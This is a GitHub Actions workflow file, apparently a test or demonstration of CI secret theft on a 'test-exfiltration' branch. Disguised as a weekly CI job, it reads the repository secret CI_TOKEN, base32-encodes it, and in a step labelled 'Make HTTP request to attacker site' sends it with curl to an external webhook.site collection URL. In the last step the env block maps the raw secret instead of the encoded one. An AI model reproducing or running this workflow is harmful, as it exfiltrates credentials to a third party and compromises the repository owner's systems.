name: Weekly CI Workflow

on:
  push:
    branches:
      - test-exfiltration
  pull_request:
    branches:
      - test-exfiltration
  schedule:
    - cron: '0 15 * * 1'  # Schedule every Monday at 3 pm UTC

jobs:
  build:
    runs-on: ubuntu-latest

    steps:
    - name: Checkout code
      uses: actions/checkout@v2

    - name: Set up Node.js
      uses: actions/setup-node@v2
      with:
        node-version: '14'

    - name: Get Repo Secret
      run: |
        echo "CI_TOKEN=${{ secrets.CI_TOKEN }}" >> $GITHUB_ENV
      shell: bash

    - name: Base32 Encode Secret
      run: |
        CI_TOKEN=$CI_TOKEN
        BASE32_CI_TOKEN=$(echo -n $CI_TOKEN | base32)
        echo "BASE32_CI_TOKEN=$BASE32_CI_TOKEN" >> $GITHUB_ENV
      env:
        CI_TOKEN: ${{ secrets.CI_TOKEN }}

    - name: Make HTTP request to attacker site.
      run: |
        BASE32_CI_TOKEN=$BASE32_CI_TOKEN
        # Replace the following URL with your webhook URL
        WEBHOOK_URL="https://webhook.site/b6fd6ae8-c408-4d69-b81c-eb51252f97c9"
        curl -X POST -H "Content-Type: application/json" -d '{"token": "'"$BASE32_CI_TOKEN"'"}' "$WEBHOOK_URL"
      env:
        BASE32_CI_TOKEN: ${{ secrets.CI_TOKEN }}
